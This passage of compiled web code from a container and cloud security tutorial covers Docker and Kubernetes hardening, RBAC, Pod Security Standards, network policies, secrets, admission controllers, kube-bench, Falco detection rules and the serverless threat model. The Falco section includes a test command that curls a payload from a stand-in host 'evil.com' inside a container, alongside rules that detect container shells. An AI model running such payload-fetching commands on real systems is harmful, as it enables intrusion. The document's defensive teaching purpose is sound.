        children: "Input: trivy image nginx:1.21.6\nScan starts ?\n1. Download vulnerability database from ghcr.io/aquasecurity/trivy-db\n2. Extract OS packages from container image layers\n3. Match packages against CVE database\n4. Found: libcrypto1.1 1.1.1k ? CVE-2022-0778 (CRITICAL, fixed in 1.1.1l)\n5. Found: libssl1.1 1.1.1k ? CVE-2022-0778 (CRITICAL, fixed in 1.1.1l)\n6. Found: nginx 1.21.6 ? CVE-2022-41741 (HIGH, fixed in 1.23.2)\nOutput: 2 CRITICAL, 1 HIGH vulnerability found\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "docker-security--edge-cases",
      children: "Docker Security — Edge Cases"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Rootless Docker (dockerd-rootless):"
        }), " Docker daemon runs without root privileges. Prevents daemon compromise from escalating to host root. Requires cgroup v2 and specific configuration."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "User namespace remapping:"
        }), " Maps container root (UID 0) to a non-privileged host UID. Effective against container escape via UID 0 exploitation."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "SYS_ADMIN capability:"
        }), " Extremely dangerous. Grants mount, namespace, and other admin operations inside container. Never grant without careful consideration."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Host PID namespace:"
        }), " ", (0,jsx_runtime.jsx)(_components.code, {
          children: "--pid=host"
        }), " exposes all host processes inside the container. Useful for monitoring but grants process-level visibility."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "kubernetes-security",
      children: "Kubernetes Security"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A naval fleet. The control plane (API server, etcd) is the command ship. Each worker node is a warship. Pods are crew squads. RBAC policies are security clearances. Network policies are radio frequencies — only authorized units can communicate. Secrets are classified documents locked in the captain's safe."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "kubernetes-attack-surface",
      children: "Kubernetes Attack Surface"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Component"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Attack Vector"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mitigation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "API server"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthenticated access, privilege escalation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OIDC, RBAC, IP whitelisting"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "etcd"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unencrypted data at rest"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "etcd encryption, TLS mutual auth"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Kubelet"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Anonymous access, unauthenticated API"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "--anonymous-auth=false"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ConfigMaps/Secrets"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Base64-only encoded secrets"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Encryption at rest, external secrets store"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Container runtime"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Container escape"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pod Security Standards, seccomp"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Network"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "East-west traffic interception"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network policies"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Service accounts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Token theft, over-privileged SA"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Auto-mount SA token: false"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Admission control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unvalidated pod specs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OPA/Gatekeeper, Kyverno"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "rbac-role-based-access-control",
      children: "RBAC (Role-Based Access Control)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Pseudocode — RBAC Configuration Pattern:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Principle: Least privilege for every identity\nEntities: User, Group, ServiceAccount\nObjects: Role (namespaced), ClusterRole (cluster-wide)\nBindings: RoleBinding, ClusterRoleBinding\n\ncreate Role(\"pod-reader\"):\n    apiGroups: [\"\"]\n    resources: [\"pods\"]\n    verbs: [\"get\", \"watch\", \"list\"]\n\ncreate RoleBinding(\"read-pods\"):\n    subjects: [{kind: \"User\", name: \"developer@company.com\"}]\n    roleRef: {kind: \"Role\", name: \"pod-reader\"}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Create a Role with least privilege\nkubectl create role pod-reader --verb=get,list,watch --resource=pods\n\n# Bind role to a service account\nkubectl create serviceaccount my-app-sa\nkubectl create rolebinding my-app-sa-binding --role=pod-reader --serviceaccount=default:my-app-sa\n\n# Check RBAC permissions\nkubectl auth can-i list pods --as=system:serviceaccount:default:my-app-sa\n\n# View RBAC audit\nkubectl describe rolebinding my-app-sa-binding\nkubectl describe clusterrolebinding view\n\n# ClusterRole for read-only access across all namespaces\nkubectl create clusterrole readonly --verb=get,list,watch --resource=pods,services,deployments\nkubectl create clusterrolebinding readonly-binding --clusterrole=readonly --user=auditor@company.com\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "pod-security-standards-pss",
      children: "Pod Security Standards (PSS)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Three levels of pod security:"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Level"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Key Restrictions"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Privileged"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unrestricted pod"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No restrictions (only for system-critical)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Baseline"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Minimal restrictions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No privileged, no hostPID, no hostNetwork"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Restricted"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Strong pod hardening"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All Baseline + seccomp=RuntimeDefault, no allowPrivilegeEscalation"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Apply Pod Security Standard via label\nkubectl label --overwrite ns default pod-security.kubernetes.io/enforce=restricted\nkubectl label --overwrite ns default pod-security.kubernetes.io/audit=restricted\nkubectl label --overwrite ns default pod-security.kubernetes.io/warn=restricted\n\n# Test enforcement\nkubectl run nginx --image=nginx  # Should be blocked if restricted\n# Error: violates PodSecurity \"restricted:latest\":\n#   - allowPrivilegeEscalation != false\n#   - seccompProfile not set to RuntimeDefault or Localhost\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Dry Run — Pod Admission with PSS:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Input: Pod spec requesting privileged=true, hostPID=true\n1. API server receives Pod creation request\n2. Admission controller checks namespace labels\n3. Namespace \"default\" has enforce=restricted\n4. Check 1: containers[0].securityContext.privileged ? true ? FAIL\n5. Check 2: containers[0].securityContext.allowPrivilegeEscalation ? not set ? FAIL\n6. Check 3: hostPID ? true ? FAIL\n7. Pod is REJECTED, user gets AdmissionError\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "network-policies",
      children: "Network Policies"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-yaml",
        children: "# Allow frontend pods to talk to backend pods on port 8080\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: backend-ingress\n  namespace: production\nspec:\n  podSelector:\n    matchLabels:\n      app: backend\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          app: frontend\n    ports:\n    - protocol: TCP\n      port: 8080\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Apply network policy\nkubectl apply -f backend-network-policy.yaml\n\n# Verify network policy\nkubectl describe networkpolicy backend-ingress -n production\n\n# Test connectivity from a different namespace pod\nkubectl run test --image=alpine --rm -it -- wget -qO- http://backend-svc.production:8080\n# Expected: connection timeout (blocked by network policy)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity Analysis — Network Policies:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Policy creation:"
        }), " O(1) — declarative YAML"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Apply to cluster:"
        }), " O(n) where n = number of pods affected"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Packet filtering overhead:"
        }), " O(p) per packet where p = number of matching policies"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Convergence time:"
        }), " Seconds (iptables rules updated on each node)"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "secrets-management",
      children: "Secrets Management"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# BAD: Hardcoded secrets in ConfigMap\nkubectl create configmap db-config --from-literal=password='supersecret'\n\n# GOOD: Native Secrets with encryption\nkubectl create secret generic db-creds --from-literal=password='supersecret'\n# Enable encryption at rest for etcd\n# Create an EncryptionConfiguration\n\n# BETTER: External secrets operator\n# Install External Secrets Operator\nkubectl create namespace external-secrets\nkubectl apply -f https://raw.githubusercontent.com/external-secrets/.../external-secrets.yaml\n\n# Define a SecretStore connecting to AWS Secrets Manager\napiVersion: external-secrets.io/v1beta1\nkind: SecretStore\nmetadata:\n  name: aws-secrets-store\nspec:\n  provider:\n    aws:\n      service: SecretsManager\n      region: us-east-1\n\n# Define an ExternalSecret that syncs to a K8s Secret\napiVersion: external-secrets.io/v1beta1\nkind: ExternalSecret\nmetadata:\n  name: db-credentials\nspec:\n  refreshInterval: 1h\n  secretStoreRef:\n    name: aws-secrets-store\n  target:\n    name: db-creds\n  data:\n  - secretKey: password\n    remoteRef:\n      key: prod/db/password\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "admission-controllers",
      children: "Admission Controllers"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Controller"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Function"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "PodSecurity"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enforce Pod Security Standards"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Block privileged pods"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "LimitRanger"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enforce resource limits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Reject pods without requests/limits"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ResourceQuota"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enforce namespace quotas"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Limit total CPU per namespace"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "OPA/Gatekeeper"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Custom admission policies"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "\"All images must come from approved registry\""
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Kyverno"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kubernetes-native policy engine"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "\"Auto-add sidecar proxy to all pods\""
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ValidatingAdmissionWebhook"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Custom validation webhook"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "\"Container images must pass CVE scan\""
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-yaml",
        children: "# OPA/Gatekeeper constraint: require all images from trusted registry\napiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sAllowedRepos\nmetadata:\n  name: require-trusted-registry\nspec:\n  match:\n    kinds:\n      - apiGroups: [\"\"]\n        kinds: [\"Pod\"]\n  parameters:\n    repos:\n      - \"docker.io/mycompany/\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install Gatekeeper\nkubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.14/deploy/gatekeeper.yaml\n\n# Verify admission controller is active\nkubectl get validatingwebhookconfigurations gatekeeper-validating-webhook-configuration\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "kube-bench-cis-benchmark",
      children: "kube-bench CIS Benchmark"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Run kube-bench against your cluster\nkubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml\n\n# Check results\nkubectl logs job/kube-bench\n\n# Run kube-bench on a specific node\nkubectl run kube-bench --image=aquasec/kube-bench:latest --restart=Never -- node\n\n# Sample results:\n# [PASS] 1.1.1 Ensure that the API server pod specification file permissions are set to 644 or more restrictive\n# [FAIL] 1.1.2 Ensure that the API server pod specification file ownership is set to root:root\n# [FAIL] 2.1 Ensure that the --anonymous-auth argument is set to false\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "falco-runtime-security",
      children: "Falco Runtime Security"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A security guard watching every door, window, and hallway in real-time. Falco monitors system calls from the kernel and alerts on suspicious behavior — like someone trying to open the server room door at 3 AM."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Falco Rule Structure:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-yaml",
        children: "# Falco rule: detect shell inside a container\n- rule: Terminal shell in container\n  desc: A shell was spawned inside a container\n  condition: >\n    spawned_process and container\n    and shell_procs\n    and not is_system_proc\n    and not user_expected_container_terminal\n  output: >\n    Shell spawned in container (user=%user.name container_id=%container.id\n    image=%container.image.repository shell=%proc.name pid=%proc.pid)\n  priority: WARNING\n  tags: [container, shell, mitre_execution]\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Live Detection of Container Drift:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-yaml",
        children: "# Detect unexpected file writes in container\n- rule: Write below binary directory\n  desc: An attempt to write to a binary directory was detected\n  condition: >\n    rename or (evt.type in (open,openat,write) and evt.dir=<)\n    and fd.directory in (/bin, /usr/bin, /sbin, /usr/sbin)\n    and not exe_running_docker_save\n    and not user_known_write_below_binary_dir_activities\n    and container\n  output: >\n    File below a known binary directory opened for writing\n    (user=%user.name command=%proc.cmdline file=%fd.name container_id=%container.id)\n  priority: WARNING\n  tags: [filesystem, container, mitre_persistence]\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install Falco on Ubuntu\ncurl -fsSL https://falco.org/repo/falcosecurity-packages.asc | gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg\necho \"deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main\" | tee -a /etc/apt/sources.list.d/falcosecurity.list\napt-get update && apt-get install -y falco\n\n# Run Falco\nsystemctl start falco\nfalco -c /etc/falco/falco.yaml\n\n# Test detection\ndocker run --rm -it alpine sh -c \"apk add curl && curl http://evil.com/payload\"\n\n# Falco alert output:\n# 23:14:05.123456789: Warning Shell spawned in container\n# (user=root container_id=abc123 image=alpine shell=sh pid=42)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity Analysis — Falco:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Syscall monitoring:"
        }), " O(1) per syscall — kernel-level event notification"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Rule evaluation:"
        }), " O(n) where n = number of rules per event"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Performance overhead:"
        }), " 1-3% CPU on typical workloads"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Alert throughput:"
        }), " Hundreds of thousands of events per second"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "ad-table--container-security",
      children: "A&D Table — Container Security"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Advantages"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantages"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Isolation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lightweight vs VMs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shared kernel — less isolation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Image scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Catch CVEs pre-deployment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "False positives, stale DB"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "RBAC"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Fine-grained access control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Complex to manage at scale"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Network policies"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Micro-segmentation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Overhead on pod startup"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Admission control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Prevent misconfigurations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Can block legitimate deployments"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Runtime security (Falco)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Real-time threat detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Alert fatigue without tuning"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "serverless-security",
      children: "Serverless Security"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A food truck that appears only when customers order. You don't manage the truck maintenance, fuel, or parking permits (provider manages the runtime). But you're still responsible for the ingredients, recipes, and cleanliness (function code, dependencies, input validation)."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "how-serverless-changes-the-security-model",
      children: "How Serverless Changes the Security Model"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Traditional Security"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Serverless Security"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Patch OS and runtime"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider patches runtime automatically"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Network firewall rules"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IAM permissions control invocation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Encrypt disks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider encrypts ephemeral storage"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Hardened VM images"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Immutable function code"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Always-on attack surface"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Functions run only on invocation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IP-based access control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Event source-based access control"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "owasp-serverless-top-10",
      children: "OWASP Serverless Top 10"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Rank"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Vulnerability"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mitigation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Event Injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attacker injects malicious event data to alter function behavior"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Input validation, schema validation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Broken Authentication"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Weak or missing function-level auth"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IAM authorizers, API Gateway auth"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Insecure Deployment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Overly permissive IAM roles, unused triggers"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Least privilege IAM, function URL restriction"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data Exposure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sensitive data in environment variables, logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Secrets Manager, encrypted env vars"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Improper Exception Handling"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stack traces in error responses"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Global error handler, custom error formatting"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
